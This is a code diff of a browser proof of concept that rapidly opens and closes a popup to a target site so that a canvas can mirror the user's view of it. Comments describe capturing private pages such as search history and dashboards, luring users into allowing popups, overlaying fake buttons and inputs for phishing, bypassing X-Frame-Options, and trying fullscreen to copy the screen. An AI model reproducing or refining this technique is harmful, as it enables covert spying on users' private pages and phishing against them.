@@ -54,6 +54,7 @@
                         //By quickly opening and closing a tab, I can choose the previous page and essentially grab a user's view of any website.
                         //Note that most browsers block popups automatically but it's still possible to lure someone into enabling popups 
                         //It also is able to view inspect element if it was opened on the previous or current page. Try opening inspect element and fiddling with the width.
+                        //Might be possible to completely copy a user's screen by enabling fullscreen although I haven't been able to get that to work because it keeps wiping the content.
                         ctx.clearRect(0, 0, canvas.width, canvas.height)
                         var str = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons and text inputs on top of areas where buttons are known to be. IFrames can do something similar, but this bypasses the X-Frames-Options header."
                         ctx.fillRect(0, 0, ctx.measureText(str).width + 6, 21)
@@ -74,13 +75,14 @@
             https://myactivity.google.com/product/search?hl=en&max=Date.now()*1000 which loads your search history in about 300ms
             web dashboards
         */
-        var w = window.open();
-        w.location = "https://google.com";        
-        setTimeout(function () {
-            w.close()
-            //doesn't work for certain websites, but the window.open still opens and the content is still mirrored
-        }, 15)
-        //the lower the time the better because the user has less time to see it. some websites take longer though, since you have to wait for content to load
+            var w = window.open();
+            w.location = "https://google.com";
+            setTimeout(function () {
+                w.close()
+                //doesn't work for certain websites, but the window.open still opens and the content is still mirrored
+            }, 15)
+            //the lower the time the better because the user has less time to see it. some websites take longer though, since you have to wait for content to load
+        
     </script>
 </body>
 
